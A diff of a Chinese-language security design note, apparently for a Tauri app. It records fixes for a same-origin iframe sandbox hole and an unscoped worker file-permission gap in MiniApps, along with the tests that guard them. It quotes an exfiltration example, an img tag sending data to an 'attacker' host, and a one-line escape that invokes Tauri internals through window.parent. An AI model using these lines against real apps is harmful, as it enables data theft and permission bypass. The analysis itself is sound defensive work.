@@ -418,70 +418,89 @@ node-forge 可签证书；拿 `127.0.0.1` 当第一跳则在 `isPrivateHostname`
 各自转红。
 
 
-**尚未修的两处（都已确认，不是推测；本节只记录，定夺见 §6 的待决清单）**：
+**本节此前列的两处"已确认但未落修"，现在都已修掉**。留在这里是因为它们各自的
+阻塞点与结论比结论本身更值得记 —— 两处的阻塞都不是"难"，而是"缺一个判据"。
 
-这一节此前列的都是"已经修掉的缺陷"。下面两条是**同一轮对抗式审查里查出来、
-确认为真、但没有落修**的 —— 之所以不落修，是因为它们各自要动一处产品级取舍，
-不属于能顺手改的范围。写在这里是为了让它们进版本历史，而不是留在某次对话里。
+### ✅ 一、iframe 与宿主 renderer 同源 —— 已修（去掉 `allow-same-origin`）
 
-### ⚠️ 一、iframe 与宿主 renderer 同源，于是整个权限模型只是建议性的
+**当时的缺口**：`SANDBOX_FLAGS` 里带着 `allow-same-origin`，而 `about:srcdoc`
+文档默认继承父文档 origin —— 于是不可信的 MiniApp 脚本与渲染进程同源，
+`window.parent.document` / `localStorage` / `document.cookie` 直接可读可写，
+`IFRAME_CSP` 的 `img-src https:` 又能把刮到的东西带出去。整个 `window.app.*`
+权限模型（fs 沙箱、net 白名单、clipboard 闸）于是只对守规矩的作者有效。
 
-`MiniAppRunner.tsx` 的 `SANDBOX_FLAGS = 'allow-scripts allow-same-origin
-allow-forms'`。`about:srcdoc` 文档继承父文档 origin，而 `allow-same-origin`
-正是保留这个 origin 的那个开关 —— 于是不可信的 MiniApp 脚本与渲染进程同源。
-同源意味着 `window.parent.document` / `localStorage` / `document.cookie` 直接可读可写，
-而 `IFRAME_CSP` 的 `img-src` 含 `https:`，所以 `<img src="https://attacker/?d=…">`
-能把刮到的东西带出去。**结论**：`window.app.*` 那一整套（fs 沙箱、net 白名单、
-clipboard 闸）只对"守规矩的作者"有效，对恶意作者形同虚设。
+**比"能读 localStorage + 能发 img"更致命的一条，是当初没写进这节的**：
+Tauri v2 **总是**往页面注入 `window.__TAURI_INTERNALS__`（`withGlobalTauri: false`
+只关掉 `__TAURI__` 那个便捷命名空间；`@tauri-apps/api/core` 的 invoke 走的正是
+`window.__TAURI_INTERNALS__.invoke`，本仓 renderer 自己也用
+`"__TAURI_INTERNALS__" in window` 做特性探测）。所以同源 MiniApp 一行
+`window.parent.__TAURI_INTERNALS__.invoke('cmd_read_workspace_file', …)` 就能拿到
+**任意 Tauri 命令** —— `app-permissions.ts` / `resolvePolicyForSidecar` /
+`checkAppPermission` / `path-safety` 一次性全部作废。同源不是"沙箱松一点"，
+是沙箱不存在。
 
-修法本身很小：从 `SANDBOX_FLAGS` 里去掉 `allow-same-origin`。宿主这一侧不依赖
-同源 —— `verifyAppCall` 验的是 `source` + nonce + appId，从不看 `event.origin`；
-内联 runtime 有 `script-src 'unsafe-inline'` 就够；`app.storage` 本来就走桥。
-代价是 `'self'` 失效，作者 HTML 里**没被内联掉**的 sibling 引用（`ui.js` /
-`style.css`）会加载失败而白屏 —— 失败关闭，方向是对的，但要先确认 source 端点
-的内联在真实构建里不会漏。
+**当时的阻塞点**："要先在真实构建里确认 source 端点的内联不漏，否则会把内置 app
+打白"。这个判据后来是查代码得到的，不需要实跑 —— 读
+`commands.rs::inline_miniapp_siblings` + `read_inline_target` 之后可以逐类枚举
+凡是**没有**被内联掉的 sibling 引用，并且证明它们**今天本来就是坏的**：
 
-**没直接改的原因**：这是 PRD v0.3 §11.1 明文写下的红线，且改动会让部分 MiniApp
-白屏，属于要先在实跑里验过再动的那种。需要一个活的 Tauri 构建确认可达范围
-（`parent.document` / `localStorage` / img 外发）才能下结论，本机没有 WebView。
+| 幸存情形 | 今天的行为 |
+|---|---|
+| 目标文件不存在 | 请求打到宿主 origin，那里不提供 MiniApp 资源 → 必然 404 |
+| 带 `..` / `.` 段 | `read_inline_target` 明确拒绝（`starts_with` 逐段比较不规范化） |
+| 远程 URL | 不在 `dependencies` 里已被 `script-src` 挡；声明了的走 `injectDependencyTags` + `buildIframeCsp` 的显式 host 白名单，不靠 `'self'` |
+| `data:` / `#` | `script-src` 无 `data:`，本来就挡 |
 
-### ⚠️ 二、`kind:'worker'` 的 MiniApp 完全绕过 fs 权限
+所以删掉 `'self'` 不会让任何原本能跑的 MiniApp 变成不能跑。
 
-两条独立的缺口叠在一起：
+**结论**：`SANDBOX_FLAGS = 'allow-scripts allow-forms'`，`IFRAME_CSP` 与
+`buildIframeCsp` 同时去掉 `'self'`（opaque origin 下 `'self'` 匹配不到任何来源，
+留着只会让人误以为还有同源关系）。宿主侧不依赖同源：nonce 校验全在宿主侧
+（`source` + nonce + appId），全仓没有任何一处读 `event.origin`；`contentWindow`
+只用于身份比较与 `postMessage`，两者跨域都成立；持久化走 `app.storage` 的宿主侧
+`storage.json`，内建 app 无一碰 `localStorage`。护栏是
+`MiniAppRunner.test.tsx` 里"两个 flag" + "没有 `allow-same-origin`" + "CSP 里没有
+`'self`'" 三条，把 flag 加回去会转红。
+
+**原文档里"少一个它 nonce 校验与 storage 分片会失效"的说法是错的**，两头都不成立：
+nonce 校验从不看 origin；storage 分片走的是 `app.storage` 而不是 `localStorage`。
+那句错的理由曾被 `miniappPipeline.dom.test.tsx` 写成断言（`toContain('allow-same-origin')`），
+现已改成 `not.toContain`，并把错误理由一并记在断言旁。
+
+### ✅ 二、`kind:'worker'` 的 MiniApp 绕过 fs 权限 —— 已修
+
+**当时的缺口**（两条独立缺口叠加）：
 
 1. `worker.call` 走 `MiniAppRunner.tsx` 自己的 message listener，直接
-   `apiPostJson('/api/miniapp/worker/call')`，**不经过 `runAppCall`**，所以权限
-   判定一次都没跑；sidecar 的 `/api/miniapp/worker/call` 也不看 `meta.json`，
-   直接转发给 pool。它验了 `source` / nonce / method 白名单 —— 那是**信任**判定，
-   不是**授权**判定，两者不能互相顶替。
-2. `kinds/file-explorer.ts` 的 `assertReadableRoot` 只做 `lstat` 反 symlink + 
-   `isDirectory`，`kinds/git-graph.ts` 的 `assertReadableCwd` 同理。两处注释都声称
-   "path-template expansion at install time defines the scope (mirror git-graph's
-   `$WORKSPACE/**` pattern)" —— **那段展开在代码里根本不存在**，全仓搜不到
-   `$WORKSPACE`。
+   `apiPostJson('/api/miniapp/worker/call')`，**不经过 `runAppCall`**，所以权限判定
+   一次都没跑；sidecar 的 `/api/miniapp/worker/call` 也不看 `meta.json`。它验了
+   `source` / nonce / method 白名单 —— 那是**信任**判定，不是**授权**判定，两者不能
+   互相顶替。
+2. 两个 kind 的 `assertReadableRoot` / `assertReadableCwd` 只做 `lstat` 反 symlink，
+   而两处注释都声称"path-template expansion at install time defines the scope" ——
+   **那段展开在代码里根本不存在**。
 
-结果：任何声明 `worker_kind: 'file-explorer'` 的 MiniApp 可以 `file.read` 读全盘、
-`file.search` 全盘扫，`git.checkout` 还能**写**任意 git 仓库的工作树，且零 fs 权限。
-反向的 bug 也有：内置 `git-graph` / `file-explorer` 只声明了 `fs.read`，没声明
-`node.enabled`，所以它们的 `app.call` 现在在 renderer 闸就被拒 —— 即**内置的
-worker MiniApp 本身也是坏的**。
+**当时的阻塞点**：`git-graph` 声明 `fs.write: []`，接上闸之后它的 `git.checkout`
+就会开始报权限错；而 `bundled-miniapps/*` 正被另一个会话并行编辑，并发 writer 纪律
+禁止碰，所以"闸"与"meta"必须一起定。两者已一起落地：闸接上
+（`resolveMiniAppFsScope` 复用 `loadMeta` + `expandTemplates` 同一 chokepoint，
+经 `workerData.fsScope` 带进 worker，`worker-rpc.ts::assertWithinFsScope` 判定），
+`git-graph` 同步改成 `fs.write: ["{workspace}/**"]`（与它早已声明的读侧同界），
+`file-explorer` 保持只读。`git.checkout` 的写闸特意查在 `assertReadableCwd` **之前**
+—— 否则"这里是不是 git 仓库"会先抛出去，未声明的 `cwd` 还能借此探测本机目录结构。
 
-修法是复用 `isPathAllowed`（不要另起一套语义）：spawn 时把展开后的 `fs.read` /
-`fs.write` 前缀经 `workerData` 带进 worker，kind 的每个 handler 都过一遍。
+**顺带暴露并修掉的第三个洞**：`git-graph` / `file-explorer` 自己就缺
+`"node": { "enabled": true }`，`app.call` 在 renderer 闸就被拒 —— **内置的 worker
+MiniApp 本身也是全死的**，且失效完全静默（拒绝是正确行为，不报错不记日志）。护栏
+`src/shared/miniapp/bundled-apps-permissions.test.ts` 把每个 `app.*` 调用拿回
+`checkAppPermission` 复算一遍。写这个护栏本身又踩了两个坑，都记在文件里：扫描器
+必须认 `app.call(method, params)` 这种两段式形态，且必须**逐文件**剥注释
+（`worker-blacklist.ts` 模板串里的 `/**` 会被当成块注释开头，吞掉 7187 个字符）。
 
-**没直接改的原因**：`bundled-miniapps/git-graph/meta.json` 当前声明
-`fs.write: []`，一旦接上这道闸，它的 `git.checkout` 就会开始报权限错 —— 要么同步
-把那个 meta 改成 `fs.write: ["{workspace}/**"]`，要么接受该功能对内置 app 失效。
-而 `bundled-miniapps/*` 正在被另一个会话并行编辑，CLAUDE.md 的并发 writer 纪律
-禁止我碰。两者必须一起定，所以留成待决项而不是半落地。
 **一个测试环境的坑，值得记下来省得重踩**：组件层的
-`event.source instanceof Window` 在 jsdom 下**恒为 false**（iframe 的
-contentWindow 与测试环境的 `Window` 不是同一个 realm），于是 handler 会把每一次
-调用都判成"不是本 iframe 发的"而丢弃。真实浏览器里 srcDoc + allow-same-origin
-的 iframe 是同 realm，判定成立。所以**不要**在 jsdom 里驱动这条消息通道来测信任
-判定——写出来的负向断言会全绿，而正向断言永远失败，两边都不代表生产行为。
-信任判定与回信都是纯逻辑，直接单测即可，这也是把它们从组件里提到
-`app-protocol.ts` 的原因。
+`event.source instanceof Window` 在 jsdom 下**恒为 false**（跨 realm），于是写出来
+的负向断言会全绿、正向断言永远失败，两边都不代表生产行为。信任判定与回信都是纯
+逻辑，直接单测即可，这也是把它们从组件里提到 `app-protocol.ts` 的原因。
 
 **仍未验证（需要真实 Provider，属于 credentialed）**：
 
@@ -529,22 +548,22 @@ listener 里的未捕获异常，作者侧的 Promise **永不 settle** —— �
    `workspacePath`，所以 Agent 的 cwd 不动。四个选项：显式拒收并记为有意不对齐 /
    把 per-turn cwd 穿到 SDK（架构变更）/ 摘掉字段 / 维持现状只记文档。
 
-3. **⚠️ 要不要去掉 iframe 的 `allow-same-origin`**。这是本清单里**唯一一个
-   修完之后整个 `window.app.*` 权限模型才真正成立**的条目：现在 MiniApp 与渲染
-   进程同源，`window.parent.document` 与 `localStorage` 直接可读、`img-src https:`
-   可外发，所以上面所有 fs / net / clipboard 的闸都只对守规矩的作者有效。
-   修法是从 `SANDBOX_FLAGS` 去掉一个 token（宿主侧不依赖同源：验的是 source +
-   nonce + appId，从不看 `event.origin`），代价是**没被内联掉**的 sibling 引用会
-   白屏。要先在活的 Tauri 构建里确认 source 端点的内联不漏，否则会把内置 app
-   打白。完整分析见上文「⚠️ 一」。
-4. **⚠️ `kind:'worker'` 的 fs 权限闸要不要接上**。`worker.call` 不经过
-   `runAppCall`，两个 worker kind 又只做反 symlink 不做范围判定，于是
-   `file-explorer` 能读全盘、`git.checkout` 能写任意仓库，且零 fs 权限。
-   修法是把展开后的 `fs.read` / `fs.write` 经 `workerData` 带进 worker 并复用
-   `isPathAllowed`。**但它和内置 app 的 meta 必须一起定**：`git-graph` 现在声明
-   `fs.write: []`，接上闸之后它的 `git.checkout` 就会报权限错，要么同步把那个
-   meta 改成 `fs.write: ["{workspace}/**"]`，要么接受该功能对内置 app 失效。
-   完整分析见上文「⚠️ 二」。
+3. **✅ 已定并已修：去掉 iframe 的 `allow-same-origin`**。这是本清单里唯一一个
+   "修完之后整个 `window.app.*` 权限模型才真正成立"的条目，现在已落地
+   （`SANDBOX_FLAGS = 'allow-scripts allow-forms'`，CSP 同步去掉 `'self'`）。
+   当时卡在"要先确认 source 端点的内联不漏"—— 查 `inline_miniapp_siblings` /
+   `read_inline_target` 就能逐类枚举，且凡是没被内联掉的引用**今天本来就是坏的**，
+   不需要活的 Tauri 构建来验。真正的杀手不是 `localStorage` / `img-src` 外发，而是
+   同源可达 `window.parent.__TAURI_INTERNALS__.invoke`（Tauri v2 总是注入它），
+   那会让上面所有 fs / net / clipboard 的闸一次性作废。完整分析见上文「✅ 一」。
+4. **✅ 已定并已修：接上 `kind:'worker'` 的 fs 权限闸**。展开后的 `fs.read` /
+   `fs.write` 经 `workerData.fsScope` 带进 worker，由 `assertWithinFsScope` 复用
+   `isPathAllowed` 判定。内置 meta 同步改了：`git-graph` 补
+   `fs.write: ["{workspace}/**"]`（与它早已声明的读侧同界）与 `node.enabled`，
+   `file-explorer` 只补 `node.enabled`、保持只读。完整分析见上文「✅ 二」。
+   **附带结论**：`node.enabled` 缺失让这两个内置 app 自己的 `app.call` 全被拒，
+   即内置 worker MiniApp 本来就是全死的，而且完全静默 —— 这条是护栏
+   `src/shared/miniapp/bundled-apps-permissions.test.ts` 挖出来的。
 
 `agent` 行剩下的 `displayText`（`InjectedTurnRequest` 没有这个字段）与
 `contextFiles`（整套子系统，`ai_context` 从未被任何代码读取）已定性为**有意不
